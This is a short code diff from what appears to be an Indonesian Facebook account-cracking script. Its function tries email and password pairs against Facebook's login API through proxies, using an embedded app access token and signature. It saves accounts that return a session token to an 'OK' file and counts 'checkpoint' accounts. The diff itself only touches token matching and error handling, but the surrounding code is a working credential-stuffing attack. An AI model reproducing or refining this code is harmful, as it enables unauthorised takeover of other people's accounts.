@@ -1313,7 +1313,7 @@ def fanky_b_api(idf, pwv):
 			# params = { "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": random.randint(40, 80), "email": idf, "password": pw, "locale": "id_ID", "sdk": "android", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6", "advertiser_id": str(uuid.uuid4()), "device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "credentials_type": "password", "client_country_code": "ID", "method": "auth.login"}
 			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': idf, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 			po = requests.get(api, params=params, headers=headers,proxies=proxs) 
-			match = re.search(r'(EAAA\w+)', po.text)
+			#match = re.search(r'(EAAA\w+)', po.text)
 			if re.search(r'(EAAA)\w+', str(po.text)):
 				ok += 1
 				#access_token = match.group(1)  # Ambil token yang coco
@@ -1325,7 +1325,7 @@ def fanky_b_api(idf, pwv):
 				prints(tree)
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
 				break
-			elif 'www.facebook.com' in po.json().get('error_msg', ''):
+			elif 'www.facebook.com' in po.json()['error_msg']:
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
